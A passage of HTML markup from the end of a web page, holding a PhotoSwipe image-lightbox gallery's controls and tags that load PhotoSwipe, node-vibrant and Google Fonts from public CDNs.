+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
